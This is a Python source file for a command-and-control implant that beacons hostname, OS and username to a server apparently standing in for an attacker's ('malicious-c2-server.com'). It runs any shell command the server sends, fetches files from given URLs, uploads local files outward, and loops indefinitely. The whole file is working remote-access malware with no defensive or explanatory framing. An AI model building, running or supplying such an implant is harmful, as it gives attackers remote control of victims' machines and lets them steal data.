import requests
import time
import subprocess
import platform
import os
from threading import Thread

class LightC2Implant:
    def __init__(self, c2_server, implant_id):
        self.c2_server = c2_server
        self.implant_id = implant_id
        self.beacon_interval = 60  # seconds
        self.running = True
    
    def beacon(self):
        """Send beacon to C2 server"""
        system_info = {
            'implant_id': self.implant_id,
            'hostname': platform.node(),
            'os': platform.system(),
            'architecture': platform.architecture()[0],
            'user': os.getlogin(),
            'timestamp': time.time()
        }
        
        try:
            response = requests.post(
                f"{self.c2_server}/beacon",
                json=system_info,
                timeout=10
            )
            return response.json()
        except:
            return None
    
    def execute_command(self, command):
        """Execute system command"""
        try:
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True,
                timeout=30
            )
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except Exception as e:
            return {'error': str(e)}
    
    def download_file(self, url, local_path):
        """Download file from URL"""
        try:
            response = requests.get(url, stream=True)
            with open(local_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            return True
        except:
            return False
    
    def upload_file(self, file_path, upload_url):
        """Upload file to C2 server"""
        try:
            with open(file_path, 'rb') as f:
                files = {'file': (os.path.basename(file_path), f)}
                response = requests.post(upload_url, files=files)
            return response.status_code == 200
        except:
            return False
    
    def main_loop(self):
        """Main implant loop"""
        while self.running:
            try:
                # Send beacon and get commands
                commands = self.beacon()
                
                if commands and 'tasks' in commands:
                    for task in commands['tasks']:
                        if task['type'] == 'execute':
                            result = self.execute_command(task['command'])
                            # Send result back to C2
                            requests.post(
                                f"{self.c2_server}/result",
                                json={
                                    'implant_id': self.implant_id,
                                    'task_id': task['id'],
                                    'result': result
                                }
                            )
                        elif task['type'] == 'download':
                            self.download_file(task['url'], task['local_path'])
                        elif task['type'] == 'upload':
                            self.upload_file(task['file_path'], task['upload_url'])
                
                time.sleep(self.beacon_interval)
                
            except Exception as e:
                time.sleep(self.beacon_interval)

if __name__ == "__main__":
    # Configuration
    C2_SERVER = "http://malicious-c2-server.com"
    IMPLANT_ID = "implant_20251103110914_57zwzm"
    
    implant = LightC2Implant(C2_SERVER, IMPLANT_ID)
    implant.main_loop()